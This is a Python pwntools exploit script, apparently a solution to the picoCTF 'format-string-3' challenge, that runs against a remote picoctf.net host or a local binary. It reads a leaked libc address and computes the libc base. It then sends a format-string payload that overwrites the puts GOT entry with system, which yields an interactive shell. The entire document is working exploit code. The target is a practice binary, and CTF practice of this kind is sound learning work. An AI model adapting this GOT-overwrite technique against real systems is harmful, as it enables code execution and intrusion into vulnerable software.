#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("rhea.picoctf.net", 58117)

    return p


def main():
    p = conn()

    input()

    # Leak libc_leak
    p.recvuntil(b'libc: ')
    libc_leak = int(p.recvline()[:-1], 16)
    print("Libc leak: " + hex(libc_leak))
    libc.address = libc_leak - 0x7a3f0
    print("Libc base: " + hex(libc.address))

    # GOT Overwrite
    part1 = libc.sym['system'] & 0xff
    part2 = libc.sym['system'] >> 8 & 0xffff
    payload = f'%{part1}c%41$hhn'.encode() + f'%{part2 - part1}c%42$hn'.encode() + p64(exe.got['puts'])
    payload += p64(exe.got['puts'] + 1)
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
